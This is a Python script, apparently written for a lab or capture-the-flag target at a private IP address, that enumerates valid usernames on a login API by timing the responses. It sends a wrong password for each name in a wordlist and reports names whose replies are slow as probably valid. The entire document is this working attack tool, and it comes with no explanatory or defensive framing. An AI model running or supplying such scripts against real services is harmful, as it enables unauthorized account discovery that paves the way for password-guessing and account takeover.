import requests as r
import time
import json

URL = "http://10.10.88.143/api/user/login"  # target endpoint
dictionary = open("./reduced.txt", "r")   # dictionary file (used my reduced Seclists)
usernames = []

for line in dictionary:  
    usernames.append(line.strip())

def login(user):
    credentials = {"username": user, "password": "invalidPassword!"}
    response = r.post(URL, json=credentials)
    if response.status_code != 200: 
        print("Error:", response.status_code)
        
print("Attacking, please wait... ")

for user in usernames:               # Not hard to understand
    startTime = time.time()
    login(user)
    endTime = time.time()
    duration = endTime - startTime
    if duration > 1:                # Time margin we tolerate (1 sec should do)
        print(user, "is probably valid!")
        
    time.sleep(0.01)  # little Delay 
    
print("All done!")
